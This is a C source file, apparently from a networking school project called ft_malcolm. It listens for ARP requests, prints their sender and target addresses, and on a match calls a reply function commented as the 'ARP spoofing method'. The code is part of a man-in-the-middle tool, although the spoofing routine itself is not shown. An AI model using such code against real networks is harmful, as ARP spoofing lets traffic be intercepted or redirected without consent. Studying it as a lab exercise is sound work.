#include "../header/ft_malcolm.h"

volatile bool STOP;

// Fonction pour imprimer l'adresse MAC
static bool print_mac_address(unsigned char *mac, const char *to_compare)
{
	char str[18];

	printf("%02x:%02x:%02x:%02x:%02x:%02x",
		   mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	snprintf(str, sizeof(str), "%02x:%02x:%02x:%02x:%02x:%02x",
			 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	str[17] = '\0';
	if (to_compare && ft_strcmp(str, to_compare) == 0)
	{
		return (true);
	}
	else
	{
		return (false);
	}
}

// Recupere paquet: verifie si c'est bien une requete ARP
// Compare l'IP de la requete avec notre IPs src d'input
// Si les IPs correspondent: construction et envoie de la res
void process_packet(int fd, unsigned char *buff, const char *ip_source, const char *ip_target, const char *mac_source, const char *mac_target)
{
	// strucure qui va recevoir le header de la requete capturée (buff)
	struct ethhdr *eth = (struct ethhdr *)buff;

	// verifie que la requete est bien de type ARP
	if (ntohs(eth->h_proto) == ETH_P_ARP)
	{
		printf(BLUE "[ARP REQUEST] " RESET "An ARP request has been cached!\n\n");

		// Récupérer l'en-tête ARP
		struct ether_arp *arp_packet = (struct ether_arp *)(buff + sizeof(struct ethhdr));

		// Convertir les adresses IP source et destination de la requête ARP en chaînes de caractères
		char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, arp_packet->arp_spa, sender_ip, INET_ADDRSTRLEN);
		inet_ntop(AF_INET, arp_packet->arp_tpa, target_ip, INET_ADDRSTRLEN);
		bool mac_sender = false;

		// Afficher les détails de la requête ARP reçue
		printf(YELLOW "[INFO] " RESET "Received ARP request details:\n");
		printf(YELLOW "[INFO] " RESET "Sender MAC: ");
		mac_sender = (const char *)print_mac_address(arp_packet->arp_sha, mac_target);
		printf("\n");
		printf(YELLOW "[INFO] " RESET "Sender IP: %s\n", sender_ip);
		printf(YELLOW "[INFO] " RESET "To reach MAC: ");
		print_mac_address(arp_packet->arp_tha, NULL);
		printf("\n");
		printf(YELLOW "[INFO] " RESET "To reach IP: %s\n\n", target_ip);

		if (ft_strcmp(ip_source, target_ip) == 0 && ft_strcmp(ip_target, sender_ip) == 0 && mac_sender == true)
		{
			printf(MAGENTA "[ARP MATCH] " RESET "IP source match the IP sender request : %s!\n\n", sender_ip);
			// ARP spoofing method
			send_arp_reply(fd, ip_source, mac_source, ip_target, mac_target);
		}
		else
		{
			printf(RED "[ARP DOESN'T MATCH] " RESET "IP or MAC source does not match the sender request : %s!\n\n", sender_ip);
		}
	}
}